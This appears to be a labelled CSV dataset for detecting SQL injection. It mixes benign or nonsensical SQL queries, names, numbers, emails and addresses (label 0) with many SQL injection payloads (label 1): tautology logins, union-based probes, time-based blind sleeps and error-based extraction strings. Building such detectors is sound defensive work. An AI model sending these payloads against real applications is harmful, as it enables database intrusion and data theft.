Query,Label
SELECT * FROM increase WHERE duck NOT BETWEEN 'position' AND 'decide',0
"select * from generate_series  (  9058,9058,case when   (  9058  =  1183  )   then 1 else 0 end  )   limit 1--",1
"  SELECT beautiful,dig,silent FROM breathing LEFT JOIN Orders ON edge.lionID =  clothes.sad ORDER BY pole.zebra",0
monvar/monver,0
"  SELECT longID AS ID, sides AS audience FROM cutting",0
"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",1
8739,0
uni/**/on sel/**/ect,1
celio,0
"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ouix""  =  ""ouix",1
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""pmmr""  =  ""pmmr",1
38747118f,0
"  SELECT deal,college FROM everybody WHERE active = 'mirror' UNION SELECT cloth, scared FROM indicate",0
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
torremoroso enrich,0
SELECT rather ( s )  FROM indeed LEFT JOIN,0
SELECT lost FROM refused UNION SELECT sad FROM mill ORDER BY careful,0
SELECT distant ( s )  FROM establish UNION,0
SELECT * FROM applied WHERE light NOT LIKE '[slowly]%',0
SELECT * FROM composition WHERE copper NOT BETWEEN 'represent' AND 'rays',0
pizani@unanuevavisionenortodoncia.tg,0
"1'||  (  select 'rfjl' where 2476  =  2476 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1
SELECT * FROM area,0
10650,0
admin' or 1  =  1/*,1
SELECT TOP 3 * FROM people WHERE sheep = 'tube' SELECT * FROM enemy,0
"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT Count ( * )  AS women,0
-3998'   )    )    or 3038  =  3038,1
1.67E+15,0
combee,0
"  SELECT * FROM composed WHERE round IN  ( 'get', 'exact', 'customs' )  ",0
"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,1
select sleep  (  5  )   and    (    (     (  'klma'  =  'klma,1
3.61806E+15,0
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1
"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv",1
besal,0
50491,0
SELECT eventually ( s )  FROM element SELECT drawn ( s ) ,0
"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""rkfk"" like ""rkfk",1
carminante,0
qunola,0
SELECT result FROM proud UNION ALL SELECT farm FROM silk ORDER BY uncle,0
1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,1
1  )   as gfhf where 5804  =  5804 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
"etorbidea nafarroa behereko, 162 6?d",0
tordera savall,0
"iif  (  5571  =  4947,1,1/0  )  ",1
SELECT COS ( 2 ) ;,0
SELECT AVG ( car ) FROM breeze,0
"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
SELECT MAX (  column_name  )  FROM table_name WHERE condition ;,0
"  SELECT * FROM us WHERE rather IN  ( 'basic', 'similar', 'certainly' )  ",0
DELETE FROM society WHERE center = 'view',0
SELECT clearly ( s )  FROM massage SELECT double ( s ) ,0
SELECT * FROM friend 3 SELECT * FROM percent,0
SELECT suggest ( s )  FROM attention SELECT range FROM dream,0
reich.puffy@g-audi.pe,0
91328189l,0
"1   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4090  =  4090",1
"1""   )    )    as cduw where 4495  =  4495",1
1 and   (  3020  =  3020  )  *6703,1
"   SELECT Employees.was, COUNT ( Orders.streetID )  AS schoolFROM    ( OrdersINNER JOIN jar ON Orders.cookiesID  =  Employees.helloID ) ",0
" SELECT column_name ( s )  FROM reader,low",0
SELECT * FROM speed FETCH FIRST 50 PERCENT ROWS ONLY,0
1'   )    )     )   and 4595  =  4595#,1
"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '%'  =  '",1
"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",1
"-8923'+  (  select xgvz where 9858  =  9858 union all select 9858,9858,9858#",1
SELECT pound ( s )  FROM seen,0
SELECT AVG ( impossible ) FROM pilot SELECT SUM ( by ) ,0
select   (  case when   (  8233  =  1074  )   then 8233 else 1/  (  select 0  )   end  )  --,1
destullecer,0
 (  select   (  case when   (  3592  =  3592  )   then 3592 else 3592*  (  select 3592 from information_schema.character_sets  )   end   )    ) ,1
tamer,0
46343482t,0
-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,1
"   SELECT cap, meal, hungry FROM captured WHERE pony  IS NULL",0
SELECT COUNT ( DISTINCT needed )  FROM barn,0
"1'  )   where 7279  =  7279 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""eslo"" like ""eslo",1
corcoy augu,0
SELECT * FROM gold WHERE greatly = 'consonant' LIMIT 3,0
65904927z,0
46700,0
1656,0
SELECT * FROM replace FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM policeman,0
-5031' or 9323  =  9323#,1
49126,0
1  )   where 9821  =  9821 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
98585223r,0
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn",1
"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",1
"  SELECT metal,needs,nice FROM flow LEFT JOIN Orders ON many.spaceID =  leg.quiet ORDER BY experience.stronger",0
"1"" union all select null,null,null,null#",1
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
-4954'  )   or 8571  =  8571--,1
"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",1
6.18286E+15,0
SELECT * FROM anybody FETCH FIRST 50 PERCENT ROWS ONLY,0
48289,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 175 )  ORDER BY meta_id ASC",0
enaciado,0
"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",1
SELECT * FROM heat WHERE    NOT army = 'under',0
SELECT * FROM judge WHERE rain = 'power'  OR pull = 'month',0
"carrer asturies, 49",0
merida@elsentidodelavida.nc,0
"select pg_sleep  (  5  )   and   (  ""%""  =  """,1
SELECT * FROM actually,0
SELECT * FROM rhythm WHERE strength = 'widely'  AND City = 'supply',0
SELECT cap ( s )  FROM few LEFT JOIN,0
1'+  (  select 'feof' where 1966  =  1966,1
"select * from generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   limit 1--",1
"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",1
"c/ fuente pista de tenis, 164",0
"  SELECT TIME_FORMAT ( ""19:30:10"", ""%H %i %s"" ) ;",0
"1%""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT AVG ( depend ) FROM women,0
"  SELECT catID AS ID, football AS held FROM plates",0
"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",1
SELECT DISTINCT solar FROM fifth,0
torrescrcela,0
"  SELECT militaryID AS ID, evening AS protection FROM park",0
"-7083"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ajcl"" like ""ajcl",1
"-5320 where 8051  =  8051 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
-9103' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'nlvq'  =  'nlvq,1
"1%"" union all select null--",1
 UPDATE shop SET must = 'decide'WHERE cloth = 'shut',0
SELECT * FROM block WHERE organization NOT LIKE 'picture%',0
SELECT related ( s FROM rod RIGHT JOIN,0
"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",1
"1  )   as qeav where 8127  =  8127 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
SELECT AVG ( Price ) FROM wing,0
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"1%'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",1
SELECT AVG ( imagine ) FROM directly,0
"   SELECT temperature, which, leaving FROM correctly WHERE mysterious  IS NULL",0
SELECT COUNT ( structure )  FROM date,0
-4542'   )    )    order by 1#,1
alfafara,0
espinoza@canariasatuaire.lb,0
22120,0
SELECT USER (  ) ;,0
"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx",1
ilsup,0
SELECT TOP 3 * FROM care WHERE figure = 'fastened',0
"1""  )   where 4849  =  4849 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT AVG ( hurt ) FROM diagram SELECT SUM ( blood ) ,0
c/ dos de mayo 89 13?b,0
"""  )  ;waitfor delay '0:0:__TIME__'--",1
SELECT TOP 3 * FROM load WHERE several = 'film',0
canaan,0
1   )    )    as smtf where 5829  =  5829,1
SELECT matter FROM frog UNION SELECT cheese FROM length ORDER BY environment,0
SELECT AVG ( sure ) FROM belt SELECT SUM ( half ) ,0
SELECT * FROM border 3,0
"sin sol 15,",0
"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""diiv""  =  ""diiv",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367537 ) ,0
SELECT * FROM cost WHERE kill = 'stick'  OR poetry = 'wore',0
"  SELECT RTRIM ( ""SQL Tutorial     "" )  AS RightTrimmedString; ",0
SELECT nose ( s )  FROM muscle SELECT musical ( s ) ,0
SELECT * FROM soldier WHERE NOT leaf = 'completely'  AND NOT instant = 'threw',0
"c/ dau 100, 10-a",0
"calle mercurio, 19,",0
androlo,0
"1""  )   as yzzk where 1813  =  1813 and   (  3020  =  3020  )  *6703--",1
SELECT * FROM success WHERE former = 'easier'  OR citizen = 'usually',0
"1%'  )   union all select null,null,null,null,null#",1
"1"" and   (  7424  =  2381  )  *2381 and ""dvju""  =  ""dvju",1
"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",1
SELECT TOP 50 PERCENT * FROM cook SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0
corota,0
"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT MIN ( salt )  AS court FROM parallel,0
SELECT TOP 50 PERCENT * FROM widely,0
"-4166%""  )   union all select 5190--",1
"INSERT INTO account  ( metal, dozen, courage )  VALUES  ( 'now', 'explanation', 'plural' )  ",0
SELECT copper ( s )  FROM day SELECT layers FROM success,0
SELECT TOP 50 PERCENT * FROM our,0
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
7497,0
SELECT MIN ( smell )  AS party FROM medicine,0
DELETE FROM zulu,0
25g0a00,0
SELECT TOP 50 PERCENT * FROM real,0
SELECT TOP 3 * FROM certainly,0
"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""zcfa""  =  ""zcfa",1
SELECT slide ( s )  FROM see,0
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""menm"" like ""menm",1
6.9084E+15,0
-1711  )   where 9098  =  9098 order by 1#,1
mcconnel,0
"INSERT INTO bus ( worry, voice, melted, express, shore, individual )  VALUES  ( 'thick', 'cave'. quick', 'sense', 'broad', 'lucky', 'hunter' )  ",0
hanley,0
"do cotaredo, 147 9e",0
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   -- jduw,1
25576,0
"1"" and make_set  (  8403  =  8403,8899  )   and ""fqxr"" like ""fqxr",1
1   )    )    as efjb where 4642  =  4642 order by 1#,1
"  SELECT roof,glass,tomorrow FROM he LEFT JOIN Orders ON plates.familiarID =  life.ate ORDER BY enter.composed",0
SELECT * FROM just WHERE cave = 'twenty'  AND  ( baseball = 'volume' OR struggle = 'available' ) ,0
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'kmjn'  =  'kmjn",1
"1   )    )    as spdf where 8554  =  8554 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11524 )  ORDER BY meta_id ASC",0
"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1
1'+  (  select 'tjvt' where 2463  =  2463,1
"1""  )   union all select null,null,null--",1
"-7700%'  )   union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",1
hermindo,0
66339533n,0
select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,1
"1""  )   as tqxa where 6751  =  6751 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
adelaide,0
-3648' where 4629  =  4629 order by 1--,1
19224,0
"select pg_sleep  (  5  )   and ""ilyw"" like ""ilyw",1
SELECT * FROM troops WHERE equal NOT LIKE '[bright]%',0
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'osov' like 'osov",1
"   SELECT tail, compass+ ', ' + farther+ ' ' + ago+ ', ' + victory AS involved  FROM frog",0
SELECT option_value FROM wp_options WHERE option_name  =  'wpassetcleanup_global_unload' LIMIT 1,0
1is4r1o,0
"1""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""opgb"" like ""opgb",1
"1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#",1
"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",1
SELECT file FROM wp_sm_sync,0
-8404   )    )    order by 1--,1
SELECT ATAN ( 2.5 ) ;,0
p7g2na,0
"-3492"" where 4094  =  4094 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
1'  )   and   (  3020  =  3020  )  *6703 and   (  'botl' like 'botl,1
"1'||  (  select 'ymez' from dual where 9870  =  9870 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT AVG ( Price ) FROM exist,0
select case when 5894  =  4052 then 1 else null end--,1
admin'or 1  =  1 or ''  =  ',1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",1
SELECT * FROM fly WHERE trace = 'rubbed',0
"1"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"   SELECT Employees.remarkable, COUNT ( Orders.somehowID )  AS biggerFROM    ( OrdersINNER JOIN realize ON Orders.southID  =  Employees.baseballID ) ",0
SELECT * FROM function WHERE society NOT LIKE '[bad]%',0
2.57E+15,0
" select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",1
SELECT AVG ( Price ) FROM red,0
1366,0
1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",1
1'||  (  select 'cfff' where 4994  =  4994,1
SELECT * FROM copy WHERE solution BETWEEN 'like' AND 'speak',0
8012,0
SELECT * FROM rod  WHERE appearance = conversation,0
SELECT * FROM some,0
"escultor bauls, 96,",0
SELECT tight FROM tears,0
"   SELECT music, noun, where FROM she WHERE rather  IS NULL",0
SELECT * FROM tree WHERE most BETWEEN '1996-07-01' AND '1996-07-31',0
"-1526'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xpob'  =  'xpob",1
"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",1
SELECT TOP 3 * FROM suppose SELECT * FROM stairs 3SELECT * FROM sharp,0
SELECT * FROM pile 3 SELECT * FROM studied,0
"-1525'   )    )     )   union all select 4110,4110,4110,4110,4110,4110#",1
SELECT * FROM itself WHERE century BETWEEN dirty09/01/1996more AND load15/31/1996case,0
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
SELECT AVG ( Price ) FROM space,0
"admin""/*",1
curul,0
carlos tomas romero 130,0
79071325q,0
"1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  3039  =  3039",1
SELECT * FROM  ( SELECT mood FROM fairly ) ,0
c/ alcazalquivir s/n,0
-6217   )    )    as hyws where 3441  =  3441 or 9421  =  4695#,1
spnola ballado,0
nealson,0
1'  )   as fyib where 9246  =  9246,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28549 )  ORDER BY meta_id ASC",0
1 exec sp_   (  or exec xp_  ) ,1
